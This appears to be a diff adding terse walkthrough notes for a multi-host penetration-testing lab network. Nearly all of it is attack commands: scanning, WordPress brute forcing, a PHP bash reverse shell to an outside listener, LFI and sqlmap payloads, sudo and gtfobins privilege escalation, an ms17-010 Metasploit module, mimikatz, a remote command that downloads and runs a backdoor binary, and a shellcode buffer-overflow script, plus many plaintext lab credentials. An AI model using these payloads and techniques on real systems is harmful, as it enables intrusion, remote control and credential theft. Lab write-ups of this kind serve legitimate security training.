@@ -1,0 +1,42 @@
+Use nmap to scan 10.10.110.0/24 and discover 10.10.110.100 nmap -T5 10.10.110.0/24
+
+10.10.110.100
+:65000 has an apache page use gobuster to find /wordpress and /robots.txt gobuster dir -e -u http://10.10.110.100:65000/ -w /usr/share/wordlists/dirb/common.txt use wpscan to find the james user wpscan --url http://10.10.110.100:65000/wordpress -e u use cewl to generate a wordlist use wpscan to bruteforce james wpscan --url http://10.10.110.100:65000/wordpress -P mycewl.txt -U users.txt -t 100 Password is Toyota login to the admin page and edit a plugin to add a php reverse shell <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/8080 0>&1'");?> use python3 to upgrade your terminal run linpeas /home/james/.bash_history has creds to balthazar mysql -u balthazar -p TheJoker12345! ssh and root with gtfobin ssh balthazar@10.10.110.100 find . -exec /bin/sh -p \; -quit cat /root/flag.txt Upload a static nmap and scan the network nmap -T5 -sP 172.16.1.0/24 nmap boxes IE -> nmap -sT -Pn 172.16.1.10 Setup a proxychains ssh -D 1080 balthazar@10.10.110.100
+
+172.16.1.10
+Apache has LFI -> :80/nav.php?page=/etc/passwd Wordpress config has margarets password page=/var/www/html/wordpress/wp-config.php page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php login as her to get a limited shell vim :set shell=/bin/sh :shell python3 -c "import pty;pty.spawn('/bin/bash')" A zip has franks password in it, /home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020.zip run pspy64 to discover a cron job runs /home/frank/call.py as root then deletes it ssh as frank, create a call.py to add an ssh key
+
+172.16.1.12
+gobuster to find /blog https://www.exploit-db.com/exploits/48615 proxychains sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs proxychains sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs -D flag --dump proxychains sqlmap 'http://172.16.1.12/blog/category.php?id=1' --dbs -D blogadmindb --dump crack ben:Welcometomyblog and ssh in old sudo is exploitable -> sudo -u#-1 /bin/bash /etc/shadow has -> julian:manchesterunited (rockyou)
+
+172.16.1.13
+gobuster to find /discuss https://www.exploit-db.com/exploits/48512 upload a php shell that bypasses av you can exploit with https://www.exploit-db.com/exploits/48505 on desktop or just enable rdp -> run as admin mimikatz -> gerald:SomeoneSaveMe98
+
+172.16.1.17
+open smb share has pcap with credential to :10000 proxychains smbclient \\172.16.1.17\forensics get monitor login to the website and run commands as root from command shell page
+
+172.16.1.102
+https://www.exploit-db.com/exploits/48552 self register as a user upload and execute av bypassing exe rogue potato for system or buffer overflow server.exe listening on port 4444
+
+172.16.1.20
+use exploit/windows/smb/ms17010psexec set payload windows/x64/shellreversetcp mimikatz to find jbercov:myspace7 katwamba:DishonestSupermanDiablo5679 administrator:KillEmAll! (cracked on hashes.org) dharding:WestminsterOrange10 rdp in and open firefox to see a 2.5 in the history mrb3n's user description has a flag you can create a socks tunnel with chisel and socat on .100 -> you
+
+172.16.2.5
+From 1.20 open powershell, use winrm to login Set-Item wsman:\localhost\client\TrustedHosts -Value 172.16.2.5 -Force $cred = get-credential (login as administrator) Enter-PSSession -ComputerName 172.16.2.5 -Credential $cred you can create a socks tunnel with chisel and socat on 1.20 -> 1.100 -> you
+
+172.16.1.19
+Use creds from 2.5 jenkins.bat to login to jenkins Admin_129834765:SamsungOctober102030 From script console println "wget http://172.16.1.100:65000/tshd -O /tmp/tshd; chmod +x /tmp/tshd; /tmp/tshd &;".execute().text run pspy64 to find a cron job runs mysql as ian with VPN123ZXC login as ian -> group allows disk access debugfs /dev/sda5 cat /root/flag.txt
+
+172.16.1.101
+Login as dharding with evil-winrm and use https://www.exploit-db.com/exploits/48543 or just login as administrator:KillEmAll!
+
+172.16.2.101
+julian:manchesterunited from 1.12 can login via ssh There's a script in julian's folder from 2 months ago, just run it with python2 and it drops to a root shell after a few control+c's
+
+Here's that script in case it goes away. julian@DANTE-ADMIN-NIX05:~$ cat exp.py import os for i in range(255): os.system(""" /usr/sbin/readfile $(python2 -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"A"*(88-27)+"{}\xe3\xff\xff\xff\x7f"') """.format("\x"+hex(i).split('x')[1]))
+
+172.16.2.6
+from 2.101 julian can login via ssh sophie cred is in the text file ~Desktop/SQL no need to root
+
+172.16.1.5
+cat 2.6:Desktop/SQL for cred, Sophie:TerrorInflictPurpleDirt996655 use xpcmd shell to get a shell msfconsole use exploit/windows/mssql/mssqlpayload set Proxies socks4:127.0.0.1:1080 read C:\DBBackups\db_backup.ps1 for sophies normal cred Alltheleavesarebrown1 evil-winrm and use juicypotato to get system
